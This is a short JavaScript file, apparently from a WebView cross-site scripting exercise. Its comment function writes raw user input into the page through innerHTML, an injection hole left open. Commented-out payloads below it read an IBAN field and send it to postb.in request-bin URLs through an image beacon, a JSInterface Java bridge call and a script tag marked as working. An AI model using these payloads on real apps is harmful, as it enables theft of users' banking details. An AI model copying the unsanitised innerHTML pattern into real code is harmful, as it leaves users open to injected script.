
function post_comment() {
	var comment = document.getElementById('comment').value;
	var newComment = '<div style="border:1px solid black;margin:5px;padding:3px;width:300px;">'+comment+'</div>';
	document.getElementById('comments').innerHTML += newComment;
	// Send comment to server
	//var xhttp = new XMLHttpRequest();
	//xhttp.open("GET", "/?comment="+comment, true);
	//xhttp.send();
}

// WEBVIEW XSS
//(function() {
//	var iban = document.getElementById('iban').text
//	console.log(iban);
//})();
//new Image().src = encodeURI('https://postb.in/1589147649821-9271736682858?iban='+document.getElementById('iban').text);

// CALL JAVA METHOD
//JSInterface.post_comment('https://postb.in/1589141605126-0508595074061', document.getElementById('iban').text);

// SCRIPT TAG !!WORKS!!
//<script type="text/javascript" src="https://postb.in/1589182329118-8149846568703?comment="+document.getElementById('iban').text></script>
